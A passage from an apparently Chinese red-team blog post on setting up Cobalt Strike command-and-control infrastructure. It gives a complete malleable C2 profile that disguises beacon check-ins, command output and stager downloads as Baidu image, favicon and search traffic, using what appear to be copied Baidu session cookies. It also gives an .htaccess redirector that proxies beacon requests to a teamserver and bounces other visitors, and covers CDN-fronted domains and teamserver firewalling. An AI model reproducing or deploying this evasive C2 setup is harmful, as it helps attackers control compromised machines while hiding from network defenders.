+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   server &#123;</span><br><span class="line"></span><br><span class="line">header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">header &quot;Cache-Control&quot; &quot;max-age&#x3D;315360000&quot;;	</span><br><span class="line">header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">header &quot;Date&quot; &quot;Tue, 08 Sep 2020 06:29:52 GMT&quot;;</span><br><span class="line">header &quot;Etag&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">header &quot;Expires&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">header &quot;Last-Modified&quot; &quot;Wed, 06 Jun 2012 05:10:47 GMT&quot;;</span><br><span class="line">header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">       output &#123;</span><br><span class="line">           netbios;</span><br><span class="line">           prepend &quot;                 &quot;;</span><br><span class="line">   		prepend &quot;GIF89a&quot;;</span><br><span class="line">   		append &quot;;&quot;;</span><br><span class="line">           print;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        我们再来配置一下http-post，这个主要是用来客户端给服务端返回命令执行的结果。首先我们先要选择一个适合伪装流量的请求，这个流量需要去向服务端发送大量的信息，但是返回信息却不用很多，经过查看发现百度大部分是请求时get请求，有一个请求会发送一个加密的url信息，所以我尝试通过伪造这个url来获取客户端的返回信息。</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908150138010.png" alt="image-20200908150138010"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;&#x2F;link&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">       </span><br><span class="line">		header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd&#x3D;%E5%8D%B0%E5%BA%A6%E5%A4%96%E9%95%BF%E5%86%8D%E8%B0%88%E4%B8%AD%E5%8D%B0%E8%BE%B9%E5%A2%83%E7%B4%A7%E5%BC%A0%E5%B1%80%E5%8A%BF&amp;rsv_idx&#x3D;2&amp;tn&#x3D;baiduhome_pg&amp;usm&#x3D;2&amp;ie&#x3D;utf-8&amp;rsv_cq&#x3D;&amp;rsv_dl&#x3D;0_right_fyb_pchot_20811_01&amp;rsf&#x3D;392deae71492ecf08ccf48e0d95afc29_1_15_1&amp;rqid&#x3D;d04f8f9d00035648&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29E3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1592203863; BAIDUID&#x3D;7B3B91054F6B7C69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; ISSW&#x3D;1; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350; H_PS_645EC&#x3D;7f76DbrvJ3OSPPa0yE9HFSBygVDDoW5VRlO3pSIe%2BNw%2FIsO0qfi9%2B7kDdR5DButmXkOX&quot;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">	    parameter &quot;url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;eqid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        parameter &quot;wd&quot; &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">	header &quot;Bdpagetype&quot; &quot;3&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;text&#x2F;html&quot;;	</span><br><span class="line">	header &quot;Server&quot; &quot;BWS&#x2F;1.1&quot;;</span><br><span class="line">	header &quot;Set-Cookie&quot; &quot;BDSVRTM&#x3D;0; path&#x3D;&#x2F;&quot;;</span><br><span class="line">	header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">    header &quot;X-Ua-Compatible&quot; &quot;IE&#x3D;Edge,chrome&#x3D;1&quot;;    </span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        我们再看下该如何配置下载stage的请求，我们知道这个请求会下载一个200多k的一个文件我们先找找有没有下载文件的请求。我们可以去以加载百度logo伪装的流量下载stage</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908152245517.png" alt="image-20200908152245517"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">	set uri_x86 &quot;&#x2F;favicon.ico&quot;;</span><br><span class="line">	set uri_x64 &quot;&#x2F;Favicon.ico&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">	header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29E3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1592203863; BAIDUID&#x3D;7B3B91054F6B7C69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350; H_PS_645EC&#x3D;7f76DbrvJ3OSPPa0yE9HFSBygVDDoW5VRlO3pSIe%2BNw%2FIsO0qfi9%2B7kDdR5DButmXkOX; BDSVRTM&#x3D;0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">    header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;image&#x2F;x-icon&quot;;	</span><br><span class="line">	header &quot;Etag&quot; &quot;423e-55c8139094a40&quot;;</span><br><span class="line">	header &quot;Last-Modified:&quot; &quot;Fri, 27 Oct 2017 06:16:01 GMT&quot;;</span><br><span class="line">    header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">    header &quot;Vary&quot; &quot;Accept-Encoding,User-Agent&quot;;</span><br><span class="line">    header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;                 @@                  (B         (         @                 @&quot;</span><br><span class="line">            print;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        配置好这些信息后我们最后再配置一下stage的混淆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stage &#123;</span><br><span class="line">	set userwx &quot;false&quot;;</span><br><span class="line">	set obfuscate &quot;false&quot;;</span><br><span class="line">	set image_size_x86 &quot;305000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        好了，差不多就配置完成了，我们将这个整体用cl2int去测试一下</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908161204018.png" alt="image-20200908161204018"></p>
+<p>​        这里有些警告说是header长度过长，这个可以先不用管</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908162211661.png" alt="image-20200908162211661"></p>
+<p>​        加载Mallable C2 profile文件开启teamserver后，生成一个shell执行后，执行可以正常上线</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163451703.png" alt="image-20200908163451703"></p>
+<p>​        再用wireshark抓下流量看看，下载stage的流量如下</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163619714.png" alt="image-20200908163619714"></p>
+<p>​        心跳包的数据包如下</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163659565.png" alt="image-20200908163659565"></p>
+<p>​        获取回显的数据包如下</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163806457.png" alt="image-20200908163806457"></p>
+<p>​        好了，配置mallable C2 profile到此为止了，附上最终的profile文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;baidu.profile&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;  </span><br><span class="line">set jitter    &quot;30&quot;;   </span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;; </span><br><span class="line"></span><br><span class="line">###SMB options###    </span><br><span class="line">set pipename &quot;ntsvcs&quot;;</span><br><span class="line">set pipename_stager &quot;ntsvc&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif&quot;;</span><br><span class="line">	client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;image&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;Keep-Alive&quot;;</span><br><span class="line">	</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">	    parameter &quot;sid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">		header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">		header &quot;Cache-Control&quot; &quot;max-age&#x3D;315360000&quot;;	</span><br><span class="line">		header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">		header &quot;Date&quot; &quot;Tue, 08 Sep 2020 06:29:52 GMT&quot;;</span><br><span class="line">		header &quot;Etag&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">		header &quot;Expires&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">		header &quot;Last-Modified&quot; &quot;Wed, 06 Jun 2012 05:10:47 GMT&quot;;</span><br><span class="line">		header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">		header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">        	netbios;</span><br><span class="line">        	prepend &quot;                 &quot;;</span><br><span class="line">	   		prepend &quot;GIF89a&quot;;</span><br><span class="line">	    	append &quot;;&quot;;</span><br><span class="line">        	print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;link&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">	    	parameter &quot;url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;eqid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">		parameter &quot;wd&quot; &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">	header &quot;Bdpagetype&quot; &quot;3&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;text&#x2F;html&quot;;	</span><br><span class="line">	header &quot;Server&quot; &quot;BWS&#x2F;1.1&quot;;</span><br><span class="line">	header &quot;Set-Cookie&quot; &quot;BDSVRTM&#x3D;0; path&#x3D;&#x2F;&quot;;</span><br><span class="line">	header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">    header &quot;X-Ua-Compatible&quot; &quot;IE&#x3D;Edge,chrome&#x3D;1&quot;;    </span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">	set uri_x86 &quot;&#x2F;favicon.ico&quot;;</span><br><span class="line">	set uri_x64 &quot;&#x2F;Favicon.ico&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line">	header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;image&#x2F;x-icon&quot;;	</span><br><span class="line">	header &quot;Etag&quot; &quot;423e-55c8139094a40&quot;;</span><br><span class="line">	header &quot;Last-Modified:&quot; &quot;Fri, 27 Oct 2017 06:16:01 GMT&quot;;</span><br><span class="line">    	header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">    	header &quot;Vary&quot; &quot;Accept-Encoding,User-Agent&quot;;</span><br><span class="line">    	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;                 @@                  (B         (         @                 @&quot;;</span><br><span class="line">            print;</span><br><span class="line">        	&#125; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stage &#123;</span><br><span class="line">	set userwx &quot;false&quot;;</span><br><span class="line">	set obfuscate &quot;false&quot;;</span><br><span class="line">	set image_size_x86 &quot;305000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="mod-rewrite对不同流量转发"><a href="#mod-rewrite对不同流量转发" class="headerlink" title="mod_rewrite对不同流量转发"></a>mod_rewrite对不同流量转发</h3><p>​        通过上面的设置，我们已经对我们的流量进行重新设置，那么现在可以根据流量来通过.htaccess来设置流量的转发操作，.htaccess文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^&#x2F;(cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif|link|favicon.ico|Favicon.ico)&#x2F;?$</span><br><span class="line">RewriteRule ^.*$ http:&#x2F;&#x2F;teamserver-ip:8880%&#123;REQUEST_URI&#125; [P]</span><br><span class="line">RewriteRule ^.*$ https:&#x2F;&#x2F;www.baidu.com&#x2F;? [L,R&#x3D;302]</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​        配置好以后我们大致进行一下测试。</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908171959301.png" alt="image-20200908171959301"></p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908172017233.png" alt="image-20200908172017233"></p>
+<p>​        应该是没有什么问题，我们回到cobaltstrike，设置一个listener，host设置为前置机对应的<strong>ip</strong>，这里还需要注意前置机的web端口应该和这里的端口一致，否则是不会上线的。</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908174336222.png" alt="image-20200908174336222"></p>
+<p>​        成功上线</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908174454181.png" alt="image-20200908174454181"></p>
+<p>​        但我们想通过域名来进行上线，但是是无法上线的，因为profile里的域名是百度的域名，我将域名改成自己的域名再进行测试。发现是可以上线的。</p>
+<p>​        因此，<strong>如果我们想用域名上线，并且给域名加上CDN，我们申请的域名必须和我们伪造的域名类似。</strong></p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908175239355.png" alt="image-20200908175239355"></p>
+<h3 id="设置防火墙"><a href="#设置防火墙" class="headerlink" title="设置防火墙"></a>设置防火墙</h3><p>​        还有最后一个问题解决，我们想要保护自己的teamserver，给我们的监听端口设置规则，只能让我们的重定向服务器访问，其他的都无法访问，该怎么做。</p>
+<p>​        使用iptables进行设置，仅允许特定的ip访问我们teamserver的8880端口</p>
